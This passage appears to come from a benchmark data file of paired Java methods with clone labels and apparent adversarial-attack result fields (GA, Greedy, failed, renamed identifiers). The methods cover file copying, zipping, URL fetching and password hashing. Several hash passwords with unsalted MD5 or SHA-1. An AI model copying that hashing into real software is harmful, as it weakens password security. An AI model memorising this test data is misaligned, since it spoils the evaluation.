        if (name != null && wanted.containsKey(name)) {
            FileOutputStream out = new FileOutputStream(wanted.get(name));
            IOUtils.copy(stream, out);
            out.close();
        } else {
            if (downstreamParser != null) {
                downstreamParser.parse(stream, handler, metadata, context);
            }
        }
    }
 <SPLIT>     private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
",105,,LABEL_1,LABEL_1,LABEL_1,-1,"parse,stream,handler,metadata,context,name,out",,,,0,,0,GA,2321,0.8373630563418071,failed,[]
333,"    public static void copyFile(File dest, File src) throws IOException {
        FileChannel srcChannel = new FileInputStream(src).getChannel();
        FileChannel dstChannel = new FileOutputStream(dest).getChannel();
        dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        srcChannel.close();
        dstChannel.close();
    }
 <SPLIT>     private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
",69,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,dest,src,srcChannel,dstChannel",,,,0,,0,GA,1876,0.6692886670430501,failed,[]
334,"    public static void compressWithZip(Vector fileList, String zipFileName) throws IOException {
        if (fileList == null || fileList.size() == 0) return;
        FileOutputStream fos = new FileOutputStream(zipFileName);
        ZipOutputStream zos = new ZipOutputStream(fos);
        Iterator iter = fileList.iterator();
        while (iter.hasNext()) {
            String fileName = (String) iter.next();
            int ind = Math.max(fileName.lastIndexOf('/'), fileName.lastIndexOf('\\'));
            String shortName = ""unknown"";
            if (ind < fileName.length() - 1) shortName = fileName.substring(ind + 1);
            zos.putNextEntry(new ZipEntry(shortName));
            FileInputStream fis = new FileInputStream(fileName);
            byte[] buf = new byte[10000];
            int bytesRead;
            while ((bytesRead = fis.read(buf)) > 0) zos.write(buf, 0, bytesRead);
            fis.close();
            zos.closeEntry();
        }
        zos.close();
    }
 <SPLIT>         public void copy(File s, File t) throws IOException {
            FileChannel in = (new FileInputStream(s)).getChannel();
            FileChannel out = (new FileOutputStream(t)).getChannel();
            in.transferTo(0, s.length(), out);
            in.close();
            out.close();
        }
",211,,LABEL_1,LABEL_1,LABEL_1,-1,"compressWithZip,fileList,zipFileName,fos,zos,iter,fileName,ind,shortName,fis,buf,bytesRead",,,,0,,0,GA,4302,1.5392242670059204,failed,[]
335,"    public static void init(Locale lng) {
        try {
            Locale toLoad = lng != null ? lng : DEFAULT_LOCALE;
            URL url = ClassLoader.getSystemResource(""locales/"" + toLoad.getISO3Language() + "".properties"");
            if (url == null) {
                url = ClassLoader.getSystemResource(""locales/"" + DEFAULT_LOCALE.getISO3Language() + "".properties"");
            }
            PROPS.clear();
            PROPS.load(url.openStream());
        } catch (IOException ioe) {
            try {
                URL url = ClassLoader.getSystemResource(""locales/"" + DEFAULT_LOCALE.getISO3Language() + "".properties"");
                PROPS.clear();
                PROPS.load(url.openStream());
            } catch (Exception e) {
                e.printStackTrace();
                System.exit(99);
            }
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(99);
        }
    }
 <SPLIT>     public static boolean isCodebaseDownloadable(Properties p) {
        class CodebaseData {

            String file;

            boolean success = true;
        }
        String codebase = p.getProperty(""java.rmi.server.codebase"", null);
        if (null == codebase) {
            if (logger.isDebugEnabled()) logger.debug(""java.rmi.server.codebase = null (return false)"");
            return false;
        }
        try {
            URL cbUrl = new URL(codebase);
            String protocol = cbUrl.getProtocol();
            String filename = cbUrl.getFile();
            if (logger.isDebugEnabled()) {
                logger.debug(""Verifying java.rmi.server.codebase setting(s)..."");
                logger.debug(""Codebase = "" + cbUrl.toString());
            }
            if (protocol.equals(""http"")) {
                if (filename.indexOf(""http"") == -1) {
                    try {
                        int size = cbUrl.openConnection().getContentLength();
                        if (logger.isDebugEnabled()) logger.debug(""Checking "" + cbUrl + "" : OK"");
                        return true;
                    } catch (IOException e) {
                        if (logger.isDebugEnabled()) logger.debug(""Checking "" + cbUrl + "" : FAIL"");
                        return false;
                    } finally {
                        if (logger.isDebugEnabled()) logger.debug(""Verifying java.rmi.server.codebase setting(s)... Done!"");
                    }
                } else {
                    ArrayList files = new ArrayList();
                    StringTokenizer st = new StringTokenizer(codebase);
                    URL url = null;
                    String part = null;
                    CodebaseData data = null;
                    while (st.hasMoreTokens()) {
                        part = st.nextToken();
                        url = new URL(part);
                        data = new CodebaseData();
                        try {
                            int len = url.openConnection().getContentLength();
                            if (len == -1) {
                                data.success = false;
                                data.file = part;
                            } else {
                                data.file = part;
                            }
                        } catch (IOException e) {
                            data.success = false;
                        }
                        files.add(data);
                    }
                    String wrong = null;
                    CodebaseData codebaseData = null;
                    boolean allOK = true;
                    int errorFiles = 0;
                    for (int i = 0; i < files.size(); i++) {
                        codebaseData = (CodebaseData) files.get(i);
                        if (!codebaseData.success) {
                            wrong += "" "" + codebaseData.file;
                            ++errorFiles;
                            allOK = false;
                        }
                        if (logger.isDebugEnabled()) logger.debug((i + 1) + "". Checking "" + codebaseData.file + "" : "" + (codebaseData.success ? ""OK"" : ""FAIL""));
                    }
                    if (errorFiles == 0) {
                        if (logger.isDebugEnabled()) logger.debug(""All entries can be downloaded successfully!"");
                    } else {
                        logger.error(errorFiles + "" of "" + files.size() + "" entries can *not* be downloaded successfully!"");
                    }
                    if (logger.isDebugEnabled()) logger.debug(""Verifying java.rmi.server.codebase setting(s)... Done!"");
                    if (allOK) {
                        return true;
                    } else {
                        return false;
                    }
                }
            } else if (protocol.equalsIgnoreCase(""file"")) {
                if (logger.isDebugEnabled()) logger.debug(""'file' protocol not supported for JSF"");
            }
        } catch (MalformedURLException e) {
            logger.debug(e.getMessage());
            return false;
        }
        return false;
    }
",182,,LABEL_0,LABEL_0,LABEL_0,-1,"init,lng,toLoad,url",,,,0,,0,GA,1519,0.5739395618438721,failed,[]
336,"    public static void doVersionCheck(View view) {
        view.showWaitCursor();
        try {
            URL url = new URL(jEdit.getProperty(""version-check.url""));
            InputStream in = url.openStream();
            BufferedReader bin = new BufferedReader(new InputStreamReader(in));
            String line;
            String develBuild = null;
            String stableBuild = null;
            while ((line = bin.readLine()) != null) {
                if (line.startsWith("".build"")) develBuild = line.substring(6).trim(); else if (line.startsWith("".stablebuild"")) stableBuild = line.substring(12).trim();
            }
            bin.close();
            if (develBuild != null && stableBuild != null) {
                doVersionCheck(view, stableBuild, develBuild);
            }
        } catch (IOException e) {
            String[] args = { jEdit.getProperty(""version-check.url""), e.toString() };
            GUIUtilities.error(view, ""read-error"", args);
        }
        view.hideWaitCursor();
    }
 <SPLIT>     KeyStore getKeyStore() throws JarSignerException {
        if (keyStore == null) {
            KeyStore store = null;
            if (providerName == null) {
                try {
                    store = KeyStore.getInstance(this.storeType);
                } catch (KeyStoreException e) {
                    e.printStackTrace();
                }
            } else {
                try {
                    store = KeyStore.getInstance(storeType, providerName);
                } catch (KeyStoreException e) {
                    e.printStackTrace();
                } catch (NoSuchProviderException e) {
                    e.printStackTrace();
                }
            }
            if (storeURI == null) {
                throw new JarSignerException(""Cannot load the keystore "" + "" error con el keystore"");
            }
            try {
                storeURI = storeURI.replace(File.separatorChar, '/');
                URL url = null;
                try {
                    url = new URL(storeURI);
                } catch (java.net.MalformedURLException e) {
                    url = new File(storeURI).toURI().toURL();
                }
                InputStream is = null;
                try {
                    is = url.openStream();
                    store.load(is, storePass);
                } finally {
                    if (is != null) {
                        is.close();
                    }
                }
            } catch (Exception e) {
                throw new JarSignerException(""Cannot load the keystore "" + storeURI, e);
            }
            keyStore = store;
        }
        return keyStore;
    }
",211,,LABEL_0,LABEL_0,LABEL_0,-1,"doVersionCheck,view,url,in,bin,line,develBuild,stableBuild",,,,0,,0,GA,3008,1.091915249824524,failed,[]
337,"    public synchronized String encrypt(String plaintext) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = null;
        md = MessageDigest.getInstance(""SHA"");
        md.update(plaintext.getBytes(""UTF-8""));
        byte raw[] = md.digest();
        String hash = (new BASE64Encoder()).encode(raw);
        return hash;
    }
 <SPLIT>     public static String getHashedPassword(String password) {
        try {
            MessageDigest digest = MessageDigest.getInstance(""MD5"");
            digest.update(password.getBytes());
            BigInteger hashedInt = new BigInteger(1, digest.digest());
            return String.format(""%1$032X"", hashedInt);
        } catch (NoSuchAlgorithmException nsae) {
            System.err.println(nsae.getMessage());
        }
        return """";
    }
",75,,LABEL_1,LABEL_1,LABEL_1,-1,"encrypt,plaintext,UnsupportedEncodingException,md,raw,hash",,,,0,,0,GA,2203,0.7725709557533265,failed,[]
338,"    @Override
    public EntrySet read(EntrySet set) throws ReadFailedException {
        if (!SourceCache.contains(url)) {
            SSL.certify(url);
            try {
                super.setParser(Parser.detectParser(url.openStream()));
                final PipedInputStream in = new PipedInputStream();
                final PipedOutputStream forParser = new PipedOutputStream(in);
                new Thread(new Runnable() {

                    public void run() {
                        try {
                            OutputStream out = SourceCache.startCaching(url);
                            InputStream is = url.openStream();
                            byte[] buffer = new byte[100000];
                            while (true) {
                                int amountRead = is.read(buffer);
                                if (amountRead == -1) {
                                    break;
                                }
                                forParser.write(buffer, 0, amountRead);
                                out.write(buffer, 0, amountRead);
                            }
                            forParser.close();
                            out.close();
                            SourceCache.finish(url);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
                super.setIos(in);
            } catch (Exception e) {
                throw new ReadFailedException(e);
            }
            return super.read(set);
        } else {
            try {
                return SourceCache.get(url).read(set);
            } catch (IOException e) {
                throw new ReadFailedException(e);
            }
        }
    }
 <SPLIT>         private long getSize(String url) throws ClientProtocolException, IOException {
            url = normalizeUrl(url);
            Log.i(LOG_TAG, ""Head "" + url);
            HttpHead httpGet = new HttpHead(url);
            HttpResponse response = mHttpClient.execute(httpGet);
            if (response.getStatusLine().getStatusCode() != HttpStatus.SC_OK) {
                throw new IOException(""Unexpected Http status code "" + response.getStatusLine().getStatusCode());
            }
            Header[] clHeaders = response.getHeaders(""Content-Length"");
            if (clHeaders.length > 0) {
                Header header = clHeaders[0];
                return Long.parseLong(header.getValue());
            }
            return -1;
        }
",269,,LABEL_0,LABEL_0,LABEL_0,-1,"read,set,in,forParser,out,is,buffer,amountRead",,,,0,,0,GA,2986,1.086581023534139,failed,[]
339,"    public static String hashPasswordForOldMD5(String password) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(password.getBytes(""UTF-8""));
            byte messageDigest[] = md.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                String hex = Integer.toHexString(0xFF & messageDigest[i]);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException nsae) {
            throw new IllegalStateException(nsae.getMessage());
        } catch (UnsupportedEncodingException uee) {
            throw new IllegalStateException(uee.getMessage());
        }
    }
 <SPLIT>     public static String hash(String value) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            byte[] md5hash = new byte[32];
            md.update(value.getBytes(""iso-8859-1""), 0, value.length());
            md5hash = md.digest();
            return Hex.encodeHexString(md5hash);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
",161,,LABEL_1,LABEL_1,LABEL_1,-1,"hashPasswordForOldMD5,password,md,messageDigest,hexString,i,hex",,,,0,,0,GA,2625,0.932506267229716,failed,[]
340,"    private String transferWSDL(String wsdlURL, String userPassword) throws WiseConnectionException {
        String filePath = null;
        try {
            URL endpoint = new URL(wsdlURL);
            HttpURLConnection conn = (HttpURLConnection) endpoint.openConnection();
            conn.setDoOutput(false);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod(""GET"");
            conn.setRequestProperty(""Accept"", ""text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"");
            conn.setRequestProperty(""Connection"", ""close"");
            if (userPassword != null) {
                conn.setRequestProperty(""Authorization"", ""Basic "" + (new BASE64Encoder()).encode(userPassword.getBytes()));
            }
            InputStream is = null;
            if (conn.getResponseCode() == 200) {
                is = conn.getInputStream();
            } else {
                is = conn.getErrorStream();
                InputStreamReader isr = new InputStreamReader(is);
                StringWriter sw = new StringWriter();
                char[] buf = new char[200];
                int read = 0;
                while (read != -1) {
                    read = isr.read(buf);
                    sw.write(buf);
                }
                throw new WiseConnectionException(""Remote server's response is an error: "" + sw.toString());
            }
            File outputDir = new File(wiseProperties.getProperty(""wise.tmpDir""));
            if (!outputDir.exists()) {
                outputDir.mkdir();
                wiseProperties.setProperty(""wise.forceImportObject"", ""true"");
            }
            File file = new File(wiseProperties.getProperty(""wise.tmpDir""), new StringBuffer(""Wise"").append(IDGenerator.nextVal()).append("".xml"").toString());
            OutputStream fos = new BufferedOutputStream(new FileOutputStream(file));
            IOUtils.copyStream(fos, is);
            fos.close();
            is.close();
            filePath = file.getPath();
        } catch (WiseConnectionException wce) {
            throw wce;
        } catch (Exception e) {
            throw new WiseConnectionException(""Wsdl download failed!"", e);
        }
        return filePath;
    }
 <SPLIT>     public final int wordFrequency(String word) {
        String replWebQuery = webQuery.replaceFirst(""WORDREPLACE"", word);
        try {
            URL url = new URL(replWebQuery);
            String content = url.toString();
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                if (inputLine.matches(nrResultsPattern)) {
                    int fr = matchedLine(inputLine);
                    if (fr >= 0) {
                        return fr;
                    }
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return 0;
    }
",409,,LABEL_0,LABEL_1,,-4,"transferWSDL,wsdlURL,userPassword,filePath,endpoint,conn,is,isr,sw,buf,read,outputDir,file,fos",,,,0,,0,Greedy,1,0.0006607532501220703,,[]
341,"    public void parse(InputStream stream, ContentHandler handler, Metadata metadata, ParseContext context) throws IOException, SAXException, TikaException {
        String name = metadata.get(Metadata.RESOURCE_NAME_KEY);
        if (name != null && wanted.containsKey(name)) {
            FileOutputStream out = new FileOutputStream(wanted.get(name));
            IOUtils.copy(stream, out);
            out.close();
        } else {
            if (downstreamParser != null) {
                downstreamParser.parse(stream, handler, metadata, context);
            }
        }
    }
 <SPLIT>     @Test
    public void test_lookupType_FullSearch_MatchingWordInMiddle() throws Exception {
        URL url = new URL(baseUrl + ""/lookupType/cluster"");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod(""GET"");
        connection.setRequestProperty(""Accept"", ""application/json"");
        assertThat(connection.getResponseCode(), equalTo(200));
        assertThat(getResponse(connection), equalTo(""[{\""itemTypeID\"":29055,\""itemCategoryID\"":17,\""name\"":\""Capital Gravimetric Sensor Cluster\"",\""icon\"":\""37_05\""},{\""itemTypeID\"":29056,\""itemCategoryID\"":9,\""name\"":\""Capital Gravimetric Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":29065,\""itemCategoryID\"":17,\""name\"":\""Capital Ladar Sensor Cluster\"",\""icon\"":\""37_07\""},{\""itemTypeID\"":29066,\""itemCategoryID\"":9,\""name\"":\""Capital Ladar Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":29069,\""itemCategoryID\"":17,\""name\"":\""Capital Magnetometric Sensor Cluster\"",\""icon\"":\""37_06\""},{\""itemTypeID\"":29070,\""itemCategoryID\"":9,\""name\"":\""Capital Magnetometric Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":29095,\""itemCategoryID\"":17,\""name\"":\""Capital Radar Sensor Cluster\"",\""icon\"":\""37_08\""},{\""itemTypeID\"":29096,\""itemCategoryID\"":9,\""name\"":\""Capital Radar Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":21013,\""itemCategoryID\"":17,\""name\"":\""Capital Sensor Cluster\"",\""icon\"":\""54_03\""},{\""itemTypeID\"":21014,\""itemCategoryID\"":9,\""name\"":\""Capital Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":32241,\""itemCategoryID\"":17,\""name\"":\""Drive Cluster EDF-285\"",\""icon\"":\""24_11\""},{\""itemTypeID\"":5279,\""itemCategoryID\"":7,\""name\"":\""F-23 Reciprocal Sensor Cluster Link\"",\""icon\"":\""03_09\"",\""metaLevel\"":4},{\""itemTypeID\"":11534,\""itemCategoryID\"":17,\""name\"":\""Gravimetric Sensor Cluster\"",\""icon\"":\""37_05\""},{\""itemTypeID\"":17340,\""itemCategoryID\"":9,\""name\"":\""Gravimetric Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":11536,\""itemCategoryID\"":17,\""name\"":\""Ladar Sensor Cluster\"",\""icon\"":\""37_07\""},{\""itemTypeID\"":17333,\""itemCategoryID\"":9,\""name\"":\""Ladar Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":11535,\""itemCategoryID\"":17,\""name\"":\""Magnetometric Sensor Cluster\"",\""icon\"":\""37_06\""},{\""itemTypeID\"":17345,\""itemCategoryID\"":9,\""name\"":\""Magnetometric Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":6218,\""itemCategoryID\"":7,\""name\"":\""Protected Gravimetric Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":1},{\""itemTypeID\"":6222,\""itemCategoryID\"":7,\""name\"":\""Protected LADAR Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":1},{\""itemTypeID\"":6226,\""itemCategoryID\"":7,\""name\"":\""Protected Magnetometric Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":1},{\""itemTypeID\"":6230,\""itemCategoryID\"":7,\""name\"":\""Protected Multi-Frequency Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":1},{\""itemTypeID\"":6234,\""itemCategoryID\"":7,\""name\"":\""Protected RADAR Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":1},{\""itemTypeID\"":7895,\""itemCategoryID\"":7,\""name\"":\""Prototype ECCM I Gravimetric Sensor Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":4},{\""itemTypeID\"":7893,\""itemCategoryID\"":7,\""name\"":\""Prototype ECCM I Ladar Sensor Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":4},{\""itemTypeID\"":7914,\""itemCategoryID\"":7,\""name\"":\""Prototype ECCM I Magnetometric Sensor Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":4},{\""itemTypeID\"":7896,\""itemCategoryID\"":7,\""name\"":\""Prototype ECCM I Omni Sensor Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":4},{\""itemTypeID\"":7892,\""itemCategoryID\"":7,\""name\"":\""Prototype ECCM I Radar Sensor Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":4},{\""itemTypeID\"":11537,\""itemCategoryID\"":17,\""name\"":\""Radar Sensor Cluster\"",\""icon\"":\""37_08\""},{\""itemTypeID\"":17336,\""itemCategoryID\"":9,\""name\"":\""Radar Sensor Cluster Blueprint\"",\""icon\"":\""03_02\""},{\""itemTypeID\"":6242,\""itemCategoryID\"":7,\""name\"":\""Sealed Gravimetric Backup Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":0},{\""itemTypeID\"":6241,\""itemCategoryID\"":7,\""name\"":\""Sealed LADAR Backup Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":0},{\""itemTypeID\"":6238,\""itemCategoryID\"":7,\""name\"":\""Sealed Magnetometric Backup Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":0},{\""itemTypeID\"":6239,\""itemCategoryID\"":7,\""name\"":\""Sealed Multi-Frequency Backup Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":0},{\""itemTypeID\"":6225,\""itemCategoryID\"":7,\""name\"":\""Sealed RADAR Backup Cluster\"",\""icon\"":\""04_10\"",\""metaLevel\"":0},{\""itemTypeID\"":20238,\""itemCategoryID\"":7,\""name\"":\""Secure Gravimetric Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":2},{\""itemTypeID\"":20244,\""itemCategoryID\"":7,\""name\"":\""Secure Ladar Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":2},{\""itemTypeID\"":20250,\""itemCategoryID\"":7,\""name\"":\""Secure Magnetometric Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":2},{\""itemTypeID\"":20260,\""itemCategoryID\"":7,\""name\"":\""Secure Radar Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":2},{\""itemTypeID\"":20240,\""itemCategoryID\"":7,\""name\"":\""Shielded Gravimetric Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":3},{\""itemTypeID\"":20246,\""itemCategoryID\"":7,\""name\"":\""Shielded Ladar Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":3},{\""itemTypeID\"":20252,\""itemCategoryID\"":7,\""name\"":\""Shielded Magnetometric Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":3},{\""itemTypeID\"":20262,\""itemCategoryID\"":7,\""name\"":\""Shielded Radar Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":3},{\""itemTypeID\"":21722,\""itemCategoryID\"":17,\""name\"":\""Sleeper Nanite Cluster\"",\""icon\"":\""55_15\""},{\""itemTypeID\"":20242,\""itemCategoryID\"":7,\""name\"":\""Warded Gravimetric Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":4},{\""itemTypeID\"":20248,\""itemCategoryID\"":7,\""name\"":\""Warded Ladar Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":4},{\""itemTypeID\"":20254,\""itemCategoryID\"":7,\""name\"":\""Warded Magnetometric Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":4},{\""itemTypeID\"":20264,\""itemCategoryID\"":7,\""name\"":\""Warded Radar Backup Cluster I\"",\""icon\"":\""04_10\"",\""metaLevel\"":4}]""));
        assertThat(connection.getHeaderField(""Content-Type""), equalTo(""application/json; charset=utf-8""));
    }
",105,,LABEL_0,LABEL_0,LABEL_0,-1,"parse,stream,handler,metadata,context,name,out",,,,0,,0,GA,2501,1.0277488191922506,failed,[]
342,"    public Object execute(ExecutionEvent event) throws ExecutionException {
        try {
            Shell shell = PlatformUI.getWorkbench().getActiveWorkbenchWindow().getShell();
            QuizTreeView view = (QuizTreeView) PlatformUI.getWorkbench().getActiveWorkbenchWindow().getActivePage().showView(""org.rcpquizengine.views.quizzes"");
            Folder rootFolder = view.getRootFolder();
            if (rootFolder.isEncrypted()) {
                PasswordDialog dialog = new PasswordDialog(shell);
                if (dialog.open() == Window.OK) {
                    String password = dialog.getPassword();
                    if (!password.equals("""")) {
                        String md5 = """";
                        MessageDigest md = MessageDigest.getInstance(""MD5"");
                        md.update(password.getBytes());
                        md5 = new BigInteger(md.digest()).toString();
                        if (rootFolder.getMd5Digest().equals(md5)) {
                            rootFolder.setMd5Digest("""");
                            rootFolder.setEncrypted(false);
                            MessageDialog.openInformation(shell, ""Quiz bank unlocked"", ""The current quiz bank has been unlocked"");
                        } else {
                            MessageDialog.openError(shell, ""Error unlocking quiz bank"", ""Incorrect password"");
                        }
                        password = """";
                        md5 = """";
                    }
                }
            } else {
                MessageDialog.openError(shell, ""Error unlocking quiz bank"", ""Quiz bank already unlocked"");
            }
        } catch (PartInitException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return null;
    }
 <SPLIT>     public static String encryptPassword(String plainPassword) {
        StringBuffer sb = new StringBuffer();
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(""MD5"");
            messageDigest.update(plainPassword.getBytes());
            byte[] digestBytes = messageDigest.digest();
            String hex = null;
            for (int i = 0; i < digestBytes.length; i++) {
                hex = Integer.toHexString(0xFF & digestBytes[i]);
                if (hex.length() < 2) sb.append(""0"");
                sb.append(hex);
            }
        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        return new String(sb);
    }
",288,,LABEL_1,LABEL_1,LABEL_1,-1,"execute,event,shell,view,rootFolder,dialog,password,md5,md",,,,0,,0,GA,3348,1.2205264767011006,failed,[]
343,"        public final String hashPassword(String password) {
            try {
                MessageDigest md = MessageDigest.getInstance(""SHA"");
                md.update(password.getBytes());
                byte[] hash = md.digest();
                return ""{SHA}"" + byteToString(hash, 60);
            } catch (NoSuchAlgorithmException nsae) {
                log.error(""Error getting password hash - "" + nsae.getMessage());
                return null;
            }
        }
 <SPLIT>     public static void main(String[] args) throws Exception {
        int result = 20;
        if (args.length == 1) {
            StringBuffer urlString = new StringBuffer(args[0]);
            if (urlString.lastIndexOf(""/"") != urlString.length() - 1) {
                urlString.append('/');
            }
            urlString.append(""GetConfig.jsp"");
            URLConnection conn = new URL(urlString.toString()).openConnection();
            System.out.println(Configuration.readObject(conn.getInputStream()));
            result = 0;
        } else {
            System.err.println(""usage: GetConfig <URL>"");
        }
        System.exit(result);
    }
",85,,LABEL_0,LABEL_0,LABEL_0,-1,"hashPassword,password,md,hash",,,,0,,0,GA,1535,0.541771117846171,failed,[]
344,"    public void saveFile(MainWindow window) {
        FileOutputStream stream = null;
        try {
            Document outputDoc = new Document();
            DocType dtd = new DocType(UI, DIRECTORY + File.separator + FILE_NAME_DTD);
            Element uiElement = new Element(UI);
            outputDoc.setDocType(dtd);
            outputDoc.addContent(uiElement);
            outputDoc.setRootElement(uiElement);
            uiElement.setAttribute(USE_DEFAULT, ""false"");
            uiElement.setAttribute(SHOW_TOOL_BAR, Boolean.toString(window.getToolToolBar().isVisible()));
            uiElement.setAttribute(SHOW_UNIT_BAR, Boolean.toString(window.getUnitToolBar().isVisible()));
            String currentLFClassName = UIManager.getLookAndFeel().getClass().getName();
            String systemLFClassName = UIManager.getSystemLookAndFeelClassName();
            if (currentLFClassName.equals(systemLFClassName)) uiElement.setAttribute(LOOK_AND_FEEL, ""native""); else uiElement.setAttribute(LOOK_AND_FEEL, ""default"");
            Element mainWindowElement = new Element(MAIN_WINDOW);
            uiElement.addContent(mainWindowElement);
            mainWindowElement.setAttribute(LOCATION_X, Integer.toString(window.getFrame().getX()));
            mainWindowElement.setAttribute(LOCATION_Y, Integer.toString(window.getFrame().getY()));
            mainWindowElement.setAttribute(WIDTH, Integer.toString(window.getFrame().getWidth()));
            mainWindowElement.setAttribute(HEIGHT, Integer.toString(window.getFrame().getHeight()));
            Element volumeElement = new Element(VOLUME);
            uiElement.addContent(volumeElement);
            AudioPlayer player = window.getDesktop().getSoundPlayer();
            volumeElement.setAttribute(SOUND, Float.toString(player.getVolume()));
            volumeElement.setAttribute(MUTE, Boolean.toString(player.isMute()));
            Element internalWindowsElement = new Element(INTERNAL_WINDOWS);
            uiElement.addContent(internalWindowsElement);
            MainDesktopPane desktop = window.getDesktop();
            JInternalFrame[] windows = desktop.getAllFrames();
            for (JInternalFrame window1 : windows) {
                Element windowElement = new Element(WINDOW);
                internalWindowsElement.addContent(windowElement);
                windowElement.setAttribute(Z_ORDER, Integer.toString(desktop.getComponentZOrder(window1)));
                windowElement.setAttribute(LOCATION_X, Integer.toString(window1.getX()));
                windowElement.setAttribute(LOCATION_Y, Integer.toString(window1.getY()));
                windowElement.setAttribute(WIDTH, Integer.toString(window1.getWidth()));
                windowElement.setAttribute(HEIGHT, Integer.toString(window1.getHeight()));
